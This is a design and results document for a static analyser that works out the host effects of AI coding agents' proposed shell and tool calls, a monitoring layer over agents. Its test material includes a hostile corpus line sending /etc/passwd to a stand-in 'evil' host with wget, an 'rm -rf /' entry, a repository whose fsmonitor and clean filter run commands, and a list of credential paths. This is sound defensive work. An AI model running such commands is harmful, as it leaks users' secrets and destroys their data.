# P2: Effect extractor and host-state probes

> Merged in v0.12.0 from `docs/design/02-effects.md` and `docs/results/02-effects.md` (tag v0.11.0). The text is unchanged except heading levels and paths. "Design NN" and "results NN" in other files mean the two parts below.

## Design

*02 — Effect extractor and host-state probes*

**Phase:** P2 · **Branch:** `feature/p2-effects`
**Gate (plan.md):** a corpus of real commands parses; anything unparseable
becomes `opaque`, and nothing crashes.

### 1. Purpose and scope

P2 turns one proposed tool call into **what it would do to the host**, without
running it. Two parts:
1. **Effect extractor.** `AgentEvent` (tool_pre) → `Analysis`: the reads,
   writes, deletes, moves, permission changes, executions, network contacts,
   privilege changes, and process signals the action would cause, plus the
   reasons the analysis is incomplete (`opaque`).
2. **Host-state probes.** For each path an effect touches: does it exist,
   what kind it is, where it really points, its git state (can the change be
   undone from git?), how much a recursive effect covers, and how sensitive
   it is.

Out of scope:
- **Scoring or deciding** (P6/P7).
- **Provenance**, i.e. where each argument came from (P3).
- **Which process runs the probes.** The daemon runs as a separate user and
  may be unable to read the user's home directory (Ubuntu's default home mode
  is 0750), so P7 decides. P2's probes are a pure library over explicit paths.

### 2. Effect model (`effects/model.py`)

```python
class EffectKind(StrEnum):
    read, write, delete, move, permission, exec, network, privilege, process

@dataclass(frozen=True, slots=True)
class Effect:
    kind: EffectKind
    target: str          # absolute normalized path | URL or host | program | process | user
    program: str         # what causes it: "rm", "redirect", "Write", ...
    recursive: bool = False
    dynamic: bool = False   # target depends on runtime values ($VAR, $(...), stdin)
    glob: bool = False      # target is an unexpanded glob pattern
    detail: str = ""        # see §2.1
    dest: str | None = None # move: destination path

@dataclass(frozen=True, slots=True)
class Analysis:
    effects: tuple[Effect, ...]
    programs: tuple[str, ...]     # every program that would run, wrappers unwrapped, source order
    opaque: tuple[str, ...]       # why some effects may be invisible; () = fully analysed
    parse_error: bool
```

#### 2.1 `detail` vocabulary (closed set, tested)

| Kind | Details |
|---|---|
| write | `create`, `truncate`, `append`, `modify`, `discard-changes` (git restore / reset --hard), `config` |
| delete | `untracked` (git clean), `ref` (git branch -D, stash drop) |
| exec | `script`, `code` (`-c`/`-e` source), `package-install`, `build`, `stdin-code` (pipe-to-shell), `remote` (ssh command) |
| network | `fetch`, `upload`, `push`, `force-push`, `delete-ref`, `connect`, `listen` (`nc -l`, `socat TCP-LISTEN:`; target `:port`) |
| privilege | `sudo`, `doas`, `su`, `pkexec` |
| process | `signal`, `stop`, `start`, `enable`, `disable`, `power` |

#### 2.2 `opaque` reasons (closed set)

`parse_error`, `eval`, `source`, `stdin_code`, `interpreter_code`,
`script_exec`, `package_install`, `dynamic_command`, `unknown_program:<name>`,
`remote_exec`, `nested_depth`, `effect_limit`, `unsupported_syntax:<node>`,
`tool:<name>` (non-shell tools with unknown semantics, e.g. MCP).

**Opaque is not "dangerous".** It means "the effect list may be incomplete";
the score and the kernel layer (K1/K2) handle that.

### 3. Shell analysis (`effects/shell.py`, tree-sitter-bash 0.25.1)

#### 3.1 Context and words

`Context(cwd: str | None, home: str, env: Mapping[str, str])`. Only these
variables are known: `HOME`, `PWD`, `USER`, plus whatever the caller puts in
`env`. Everything else is *dynamic*.

Word evaluation (tree-sitter nodes → `Word(text, dynamic, glob)`):
- **Literal text:** `word`, `raw_string` and `string` are literal with quotes
  removed. `ansi_c_string` is decoded.
- **Known variables:** `$HOME`/`${HOME}`, and a `~` at the start of an
  unquoted word, are substituted from the context.
- **Dynamic:** unknown variables, `$(…)`, backticks, `$((…))`, and process
  substitution make the word dynamic. Their text is kept as written.
- **Globs:** `*`, `?`, `[` in *unquoted* parts set `glob`.

Paths are joined to the effective cwd and normalized lexically (`..`
collapsed, no symlink resolution; the probes resolve symlinks). If the cwd is
unknown, relative paths stay relative and are `dynamic`. Special files
`/dev/null`, `/dev/stdout`, `/dev/stderr`, `/dev/tty`, `/dev/fd/*` produce no
effect.

#### 3.2 Structure

| Construct | Handling |
|---|---|
| `list` (`;`, `&&`, `\|\|`, newline) | in order; `cd DIR` changes the cwd for the commands after it |
| `pipeline` | each element in a copy of the context (subshell); a shell or interpreter reading stdin after a `\|` → `exec stdin-code` + opaque `stdin_code` |
| `subshell` `( … )` | a copy of the context |
| `compound_statement` `{ …; }`, `if`, `while`, `for`, `case`, `function_definition` | every branch and body is analysed: a static analyser assumes any branch may run |
| `redirected_statement` | file redirects: `>`/`>\|`/`&>` → write `truncate`, `>>`/`&>>` → write `append`, `<` → read, `<>` → read+write; fd duplication (`2>&1`) none; heredocs and herestrings none |
| `variable_assignment` alone | none |
| `command` | §3.3 |
| `ERROR` / missing nodes | `parse_error = True`, opaque `parse_error`; well-formed sub-trees are still analysed |
| other node types | opaque `unsupported_syntax:<type>` |

Limits: nested-shell depth 4 → `nested_depth`; 1,000 effects →
`effect_limit`.

#### 3.3 Commands: data-driven catalog (`effects/commands/`)

The command name is evaluated as a word. A dynamic name → `dynamic_command`.
`/usr/bin/rm` → `rm` (basename). Each catalogued program has a handler with a
GNU-style option spec (short flags that can be combined, `--long=value`,
`--`). The handler gets the evaluated arguments and the context, and returns
effects, opaque reasons, and nested commands to analyse.

| Group | Programs | Effects |
|---|---|---|
| Wrappers (unwrapped) | `sudo`, `doas`, `pkexec`, `su -c`, `time`, `nice`, `nohup`, `timeout`, `env`, `command`, `exec`, `stdbuf`, `ionice`, `xargs`, `find -exec/-execdir/-ok` | privilege effect for sudo/doas/su/pkexec; inner command analysed; `xargs` and `find -exec` give the inner command a dynamic target (`find`: under its search paths, recursive) |
| Shells | `bash`, `sh`, `zsh`, `dash`, `ksh` | `-c` with a literal string: re-parsed (depth+1); dynamic `-c` → `exec code` + `interpreter_code`; script file → `exec script` + `script_exec`; no script and no `-c` (code from a pipe, a redirect, a heredoc or a terminal) → `exec stdin-code` + `stdin_code` |
| Interpreters | `python*`, `node`, `deno`, `ruby`, `perl`, `php`, `lua`, `Rscript` | `-c`/`-e` → `exec code` + `interpreter_code`; script → `exec script` + `script_exec`; `python -m X` → `script_exec` (`pip install` → `package_install`) |
| Delete | `rm` (`-r -R --recursive -d`), `rmdir`, `unlink`, `shred` (`-u`) | delete |
| Write | `touch`, `mkdir`, `ln`, `tee`, `truncate`, `install`, `sed -i`, `dd of=`, `mkfs*`, `wipefs` | write (`create`/`truncate`/`append`/`modify`) |
| Copy, move | `cp` (`-r -t`), `mv` (`-t`), `rsync` (local) | cp: read src + write dest; mv: move src→dest; `rsync --delete` adds delete at dest |
| Archives | `tar`, `zip`, `unzip`, `gzip`/`gunzip`/`bzip2`/`xz` | create/extract → read + write; in-place compress → delete src + write src.gz (unless `-k`) |
| Permissions | `chmod`, `chown`, `chgrp`, `chattr`, `setfacl` | permission (`-R` recursive; mode/owner argument skipped) |
| Read-only | `cat`, `less`, `head`, `tail`, `grep`/`egrep`/`fgrep`, `rg`, `ag`, `wc`, `sort`, `uniq`, `cut`, `diff`, `cmp`, `comm`, `file`, `stat`, `ls`, `tree`, `du`, `find`, `md5sum`/`sha*sum`, `strings`, `xxd`, `od`, `base64`, `jq`, `nl`, `column`, `awk`, `sed` (no `-i`), … | read on file arguments; `find` without actions reads its paths recursively |
| Effect-free | `echo`, `printf`, `pwd`, `true`, `false`, `test`, `[`, `date`, `whoami`, `id`, `uname`, `which`, `type`, `basename`, `dirname`, `seq`, `sleep`, `export`, `unset`, `alias`, `read`, `cd`, `ps`, `df`, `free`, `uptime`, `hostname`, `printenv`, … | none |
| Network | `curl`, `wget`, `ssh`, `scp`, `sftp`, `rsync` (remote), `nc`/`ncat`/`netcat`/`socat`/`telnet`, `ping`, `dig`, `nslookup`, `host` | network on the URL or host (`fetch`/`upload`/`connect`); `-o`/`-O`/`-P` → write; `-d @f`, `-T f`, `-F x=@f`, `--post-file f` → read + `upload`; `ssh host cmd` → `exec remote` + `remote_exec`; scp/rsync direction from `host:` syntax |
| Git | `git` + subcommand | read-only (`status`, `log`, `diff`, `show`, `blame`, `grep`, `ls-files`, `rev-parse`, `branch` list, `remote -v`); history writes (`add`, `commit`, `stash`, `merge`, `rebase`, `cherry-pick`, `tag`, `switch`, `checkout <branch>`) → write on the repo `.git`; `reset --hard`, `checkout -- p`, `restore p` → write `discard-changes`; `clean -f[dx]` → delete `untracked`; `branch -D`, `stash drop/clear` → delete `ref`; `push` → network `push`, or `force-push` with `-f`/`--force*`/`+ref`; `pull`/`fetch`/`clone` → network fetch (+ write); `config` → write `config` |
| Packages and builds | `npm`/`pnpm`/`yarn`/`bun`, `pip`/`pip3`/`uv`, `cargo`, `go`, `make`, `cmake`, `ninja`, `gradle`, `mvn`, `pytest`, `docker`/`podman`, `apt`/`apt-get`/`dpkg`/`snap` | install → `exec package-install` + network + `package_install`; run/test/build → `exec build` + `script_exec` |
| Processes, system | `kill`, `pkill`, `killall`, `systemctl`, `service`, `shutdown`, `reboot`, `poweroff`, `halt`, `crontab`, `at` | process (`signal`/`stop`/`start`/`enable`/`disable`/`power`); `crontab file`/`-e`/`-r` → write `config` on the crontab |
| Evaluation | `eval`, `source`, `.` | `eval` → `eval`; `source f` → read + `source` |

`awk` and `sed` programs are scanned: `system(`, `| getline`, `print >`
(awk), and `e`/`w` commands (sed) → opaque `interpreter_code`. Any other
program → `exec` + `unknown_program:<name>`. Its arguments are **not** guessed
as file targets: what an unknown program does with them is unknown, and the
opaque reason says exactly that.

#### 3.4 Conventions (fixed with the corpus labels, before the code)

- **`programs`** lists every command name that runs, in *source* order,
  including builtins (`cd`, `export`, `:`) and wrappers (`sudo rm` →
  `sudo`, `rm`). It includes commands inside `$(…)`, backticks and process
  substitution, since those run too. `[ … ]` and `[[ … ]]` are test
  expressions, not programs. A call to a function defined in the same
  command is listed by name and is not `unknown_program`; its body is
  analysed where it is defined.
- **Command names:** `/usr/bin/rm`, `"rm"` and `\rm` are `rm`. A name with a
  `/` outside the system bin directories (`./run.sh`) is `exec script` on the
  resolved path, and is listed under that path.
- **Write `detail`:** `create` makes an entry without destroying content
  (`touch`, `mkdir`, `ln` without `-f`, `git clone`, the agent's own Write
  tool). `truncate` replaces content wholesale (`>`, `cp`/`install`/`dd`/
  `curl -o`/`wget`/`tar x`/`unzip` destinations, `ln -f`, `mkfs`). `modify`
  edits in place (`sed -i`, `perl -i`, Edit, git history writes). `append`
  is `>>` and `tee -a`. Whether a `create` actually replaces an existing file
  is the probe's job.
- **Dynamic words** are not joined to the cwd: the target is the text as
  written, with known variables substituted (`$TMPDIR/x`, `$f.gz`). Quoted
  glob characters are literal. Process substitutions are pipes, never file
  targets.
- **`xargs`** gives its inner command one extra argument, `<stdin>`
  (dynamic). `find -exec … {} …` replaces `{}` with each search path
  (dynamic, recursive). `find -delete` is a dynamic, recursive delete on each
  search path.
- **No-argument defaults:** `ls`, `du`, `find` and `grep -r`/`rg` with no
  path read the cwd (recursively for `du`, `find`, `grep -r` and `rg`). After
  `cd -` or `cd $VAR` the cwd is unknown, so such a target is `.` (dynamic).
- **Network targets:** a URL for `curl`/`wget`/`WebFetch`/`git clone`; a
  bare host (any `user@` removed) for `ssh`/`scp`/`rsync`/`ping`/`dig`;
  `host:port` for `nc`; a remote name for `git push`/`pull`/`fetch`, and
  `upstream` (dynamic) when none is given; `registry:<manager>` for package
  managers.
- **Git targets:** repository-wide reads and resets target the work tree
  (cwd, or `git -C DIR`), recursively. History writes target `<repo>/.git`.
  Ref deletes target `<repo>/.git/refs/heads/<branch>` or `.git/refs/stash`.
  `git config` targets `<repo>/.git/config`, or `~/.gitconfig` with
  `--global`.
- **Privilege** targets the user (default `root`). `sudo` or `su` with no
  command adds `exec stdin-code` (an interactive root shell).
- **Crontab** targets `/var/spool/cron/crontabs/<USER>`.

### 4. Non-shell tools (`effects/tools.py`)

| Agent tool | Input keys | Effects |
|---|---|---|
| Claude `Write` | `file_path` [RUN] | write (`create`, or `truncate` when the probe finds the file exists) |
| Claude `Edit` | `file_path` [DOC] | write `modify` |
| Claude `Read` | `file_path` [DOC] | read |
| Claude `WebFetch` | `url` [DOC] | network `fetch` |
| OpenCode `write` | `path` [RUN] | write `create` |
| `Tool.shell` (both) | `command` [RUN] | §3 |
| `Tool.mcp`, `Tool.other` | — | opaque `tool:<tool_raw>` |

A missing or wrong-typed key → opaque `tool:<tool_raw>` (never a crash; P7
treats opaque plus missing input as suspicious).

### 5. Host-state probes (`hoststate/`)

`probe(paths, *, project_root, home) -> dict[str, PathState]`. Reads only:
no writes, no command execution.

```python
@dataclass(frozen=True, slots=True)
class PathState:
    path: str
    exists: bool
    kind: Literal["file", "dir", "symlink", "other", "missing"]
    real_path: str | None            # symlinks resolved; outside project_root is flagged
    in_project: bool
    git: Literal["clean", "modified", "untracked", "ignored", "not_in_repo", "unknown"]
                                     # a directory: the worst state inside it; missing: unknown
    files: int | None                # recursive coverage, capped
    bytes: int | None
    capped: bool                     # walk hit a cap; counts are lower bounds
    sensitivity: frozenset[str]
```

- **Walk.** Never follows symlinks. Caps: 10,000 entries, depth 32,
  0.5 s. Hitting any cap sets `capped`.
- **Globs.** `glob` targets are expanded with `glob.glob` (no shell, no
  command substitution), capped at 1,000 matches.
- **Git.** Through **pygit2** (libgit2), not the `git` CLI. A repository the
  agent controls could set `core.fsmonitor` or a `filter.<x>.clean` command,
  and the `git` CLI runs those during `git status`, as rootsh's user.
  libgit2 runs no config-defined external commands. A test proves that a
  hostile repository's fsmonitor and clean filter never run. `clean` means
  the file's content is in git, so a change can be undone; `modified`,
  `untracked` and `ignored` mean it cannot.
- **Sensitivity** (data-driven rule table, tested):

| Class | Examples |
|---|---|
| `secret` | `~/.ssh/**`, `~/.aws/**`, `~/.gnupg/**`, `~/.kube/**`, `~/.netrc`, `~/.git-credentials`, `~/.config/gh/**`, `**/.env*`, `*.pem`, `*.key`, `id_rsa*`, `id_ed25519*` |
| `vcs_internal` | `**/.git/**` |
| `data_store` | `**/migrations/**`, `*.db`, `*.sqlite*`, `*.sql` |
| `ci` | `**/.github/workflows/**`, `.gitlab-ci.yml` |
| `persistence` | `~/.bashrc`, `~/.zshrc`, `~/.profile`, `~/.bash_profile`, `~/.config/autostart/**`, `~/.config/systemd/user/**`, `/var/spool/cron/**`, `**/.git/hooks/**` |
| `agent_config` | `~/.claude/**`, `**/.claude/**`, `**/CLAUDE.md`, `**/AGENTS.md`, `~/.config/opencode/**`, `**/.opencode/**` |
| `rootsh` | `/etc/rootsh/**`, `/var/lib/rootsh/**`, `/opt/rootsh/**`, `/etc/claude-code/**` |
| `system` | `/etc/**`, `/usr/**`, `/boot/**`, `/bin/**`, `/sbin/**`, `/lib*/**`, `/dev/**`, `/proc/**`, `/sys/**` |

### 6. Dependencies

| Package | Version | License | Why |
|---|---|---|---|
| tree-sitter | 0.26.1 | MIT | parser runtime (chosen in P0 §4) |
| tree-sitter-bash | 0.25.1 | MIT | bash grammar |
| pygit2 | latest with a 3.12 wheel (verified at install) | GPLv2 with linking exception | git state with no external command execution |

### 7. Corpora

1. **Hand-labelled corpus** `tests/fixtures/effects_corpus.json`: at least
   150 commands covering every row of §3.2–§3.3 and §4, each with its expected
   effects, programs, opaque reasons and parse-error flag, in a fixed context
   (`cwd=/w`, `home=/home/u`). **Committed before the extractor exists**; the
   commit order proves the labels weren't fitted to the output. Comparison:
   effects as multisets, programs as ordered lists, opaque as sets. For
   malformed commands (`partial: true`), tree-sitter's error recovery
   decides which fragments survive, so only `parse_error` and `opaque` are
   compared.
2. **Robustness corpus:** NL2Bash `all.cm`, 12,607 commands (MIT, commit
   10963c9, sha256 `3a72eace…be57e`), downloaded to `data/nl2bash/`
   (git-ignored). Only aggregates are committed.

### 8. Acceptance criteria (P2 gate)

Targets were set before any run:
1. **NL2Bash:**
   - 0 crashes over all 12,607 commands;
   - every parse error is reported as opaque `parse_error`;
   - per-command analysis time p99 ≤ 5 ms;
   - opaque rate reported in total and by reason (reported, not a
     pass/fail threshold).
2. **Hand-labelled corpus:** ≥ 95% of commands match exactly. Every miss is
   listed in the summary; labels are not edited after the first run (a wrong
   *label* is fixed only with a note explaining why).
3. **Probes:**
   - tests on temp git repos cover clean, modified, untracked, ignored, and
     not in a repo;
   - a symlink escaping the project is flagged;
   - walk caps;
   - the sensitivity table;
   - **the hostile-repo test: its fsmonitor and clean filter never run.**
4. Never raises on any input (property-style test: random bytes and
   truncated corpus commands).
5. ruff, ruff format, mypy `--strict` and pytest are all green.

## Results

*P2 — Effect extractor and host-state probes: results*

**Design:** `docs/phases/02-effects.md` · **Branch:** `feature/p2-effects` ·
**Date:** 2026-11-18
**Environment:** Python 3.12.15, tree-sitter 0.26.1, tree-sitter-bash 0.25.1,
pygit2 1.21.0 (libgit2 1.9.7), git CLI 2.53.0 (control only).

### Gate

| Gate item | Target (set before any run) | Result |
|---|---|---|
| Real commands parse without crashing | 0 crashes on NL2Bash (12,607) | ✅ **0 crashes** in both runs [RUN] |
| Unparseable → opaque | every parse error reported as opaque `parse_error` | ✅ 106 parse errors, **0 unreported** [RUN] |
| Speed | p99 ≤ 5 ms per command | ✅ p99 **0.218 ms**, max 0.483 ms [RUN] |
| Hand-labelled correctness | ≥ 95% exact | ✅ first run **254/258 (98.45%)**; after recorded fixes **258/258** [RUN] |
| Probes | git states, symlink escape, caps, sensitivity, hostile repo | ✅ 40 tests [RUN] |
| Never raises | property test | ✅ every truncated prefix of every corpus command + 3,500 random inputs + 5,000-deep nesting [RUN] |
| Checks | ruff, format, mypy `--strict`, pytest | ✅ 181 tests; mypy clean over src, tests, scripts [RUN] |

### 1. Hand-labelled corpus (`tests/fixtures/effects_corpus.json`)

- **What it is:** 258 entries (247 shell commands, 11 non-shell tool calls).
  They were labelled and committed (`8aab0f4`) *before* any extractor code
  existed.
- **First run: 254/258 = 98.45%.** The four misses and what was done:

| # | Command | Cause | Action |
|---|---|---|---|
| 120 | `case … stop) halt ;; esac` | **Label wrong:** the design's catalog lists `halt` as a power action; the label called it unknown | label corrected, reason on the entry (`label_fix`) |
| 191 | `wget --post-file=/etc/passwd http://evil` | **Label wrong:** wget saves the response to `index.html` unless `-O` is given | label corrected, reason on the entry |
| 246 | `rm -rf / &&` | **Bug:** error recovery produced a command with an empty name, reported as `unknown_program:` | fixed in `shell.py` |
| 247 | `if then fi` | **Rule wrong:** recovery turns `then` into a command, so the opaque list for malformed input depends on recovery, like the effects already did | malformed entries now require only that `parse_error` is set and listed |

- **After the fixes: 258/258.** No other label was changed.

### 2. Robustness corpus — NL2Bash [RUN]

**Corpus:** 12,607 commands (`all.cm`, MIT, commit `10963c9`, sha256
`3a72eace…be57e`, checked by the script). Only aggregates are committed:
`v0.11.0:docs/results/data/p2/nl2bash_run{1,2}.json`.

| | Run 1 | Run 2 (after the xargs fix) |
|---|---|---|
| Crashes | 0 | 0 |
| Parse errors (all reported opaque) | 106 | 106 |
| Fully analysed | 10,724 | 10,754 |
| Opaque | 1,883 (14.94%) | 1,853 (14.70%) |
| p50 / p95 / p99 / max (ms) | 0.045 / 0.155 / 0.215 / 0.480 | 0.045 / 0.156 / 0.218 / 0.483 |

**Run 1 found a real bug.** `{}` appeared as an "unknown program" 23 times.
GNU `xargs -i[R]` takes an *optionally attached* value, and the parser took
the next word, the actual command, as that value (40 corpus commands use
`-i`). The fix rewrites `-i`/`-e`/`-l`/`--replace`/`--eof`/`--max-lines`
before the command starts, with 5 regression tests.

**Opaque by reason (run 2):**

| Reason | Count |
|---|---|
| `unknown_program` | 1,215 |
| `interpreter_code` | 244 |
| `remote_exec` | 120 |
| `script_exec` | 112 |
| `parse_error` | 106 |
| `stdin_code` | 61 |
| `dynamic_command` | 54 |
| `source` | 26 |
| `package_install` | 17 |
| `eval` | 3 |

**The main coverage gap is unknown programs.** The most common are `split`
(122), `mount` (88), `ifconfig` (65), `rename` (63), `cpio` (57), `mktemp`
(54), `screen` (42), `watch` (40) and `pstree` (37). **They were not added to
the catalog**: NL2Bash is the robustness set, and tuning the catalog to it
would turn the opaque rate into a fitted number. Coverage grows from P4's real
agent traces instead, and P4 re-measures the opaque rate on that traffic.

### 3. Host-state probes [RUN]

- **Git states, all tested on temp repos:**
  - `clean`: committed, or staged only, so the content is in git's object
    store and recoverable;
  - `modified`, `untracked`, `ignored`;
  - `not_in_repo`;
  - `unknown`: `.git` internals, missing paths, libgit2 errors (including
    its refusal of repositories owned by another user).

  A directory takes the worst state inside it.
- **Hostile repository:** the repository sets `core.fsmonitor` and a
  `filter.evil.clean` driver to commands that create marker files.
  - Rootsh's probe: **no marker created**.
  - Control, `git status` from git 2.53.0: **both markers created**
    (`filter-ran`, `fsmonitor-ran`).

  Had the daemon used the git CLI, any repository an agent can write to could
  run code as Rootsh's user.
- **Symlinks** are never followed during walks. A link inside the project
  that resolves outside is reported with `in_project = False`.
- **Caps** on entry count and depth (tested) and on time; any cap marks the
  counts as lower bounds.
- **Sensitivity:** every class in the rule table has a test. Directories also
  get the classes of known sensitive locations inside them (`rm -rf ~` →
  `secret`, `persistence`) and of every walked entry (a project containing
  `.env` → `secret`).

### 4. As built vs. the design doc

- `rsync` lives in the network handlers (it covers both local and remote
  copies).
- Missing paths report git `unknown` (nothing to recover).
- Glob expansion follows bash defaults: `*` does not match dotfiles.
- Tree-depth limit is 200 statements, besides the nesting limit of 4.
- `awk -f prog` and `sed -f script` are not opaque. The labels fixed that
  before the code; programs in files are a known blind spot.

### 5. Open items for later phases

1. **Where probes run (P7).** The daemon runs as a separate user and may be
   unable to read `$HOME` (Ubuntu's default mode is 0750). The probes are a
   pure library, so P7 can run them in the hook client (user-side) or grant
   read access.
2. **Probe latency on large repositories.** `repo.status()` scans the whole
   work tree and is not measured yet. P7 measures it and adds a time budget
   or caching.
3. **Catalog coverage** is driven by P4 traces (above).

### 6. Post-merge audit of P0–P2

A full read of the code, tests and docs after the layout refactor. Every bug
was reproduced before fixing and now has a regression test [RUN].

| Finding | Kind | Fix |
|---|---|---|
| `(cd x; rm y)`: statements inside a subshell got a fresh cwd each, so `rm` resolved to `/w/y` | bug | a subshell runs its statements in order; nothing leaks out (`/w/x/y`) |
| `sudo -e /etc/hosts` was analysed as running a program named `/etc/hosts` | bug | sudoedit is a privileged write `modify` on its operands |
| `dpkg -r nginx` read a file named `nginx` | bug | only `-i`/`--install`/`--unpack` operands are `.deb` files |
| A not-yet-created file in a project reached through a symlink was reported outside the project | bug | `in_project` compares fully resolved paths for missing paths too |
| `nc -l 8080` produced no effect, though a listening socket is how a bind shell or inbound channel starts | gap | new network detail `listen` (`nc -l`, `socat TCP-LISTEN:`) |
| `expand_glob` was sorted except when capped | inconsistency | always sorted |
| `Word.literal`, unused `Analysis.fully_analysed` | dead code | removed / now used by the robustness script |
| Corpus test accepted ≥ 95%, so up to 12 regressions could pass silently | weak test | now requires an exact match |
| Guard test with no assertion; no test for the walk's time cap or the concurrent-migrator path | missing tests | added |
| `docs/plan.md` statements disproved or decided since approval | stale docs | annotated in place |

**Re-run after the fixes:** hand-labelled corpus still 258/258.
**NL2Bash:** identical gate numbers to run 2 (0 crashes, 106 parse errors,
1,853 opaque, same opaque reasons); the only change is network effects
353 → 354, the corpus's one `nc -l` now counted. p99 0.2225 ms. **Tests:** 190.

### Decision

**Gate passed → merge P2.** Next is P3, the provenance engine: where each
critical argument of an action came from.
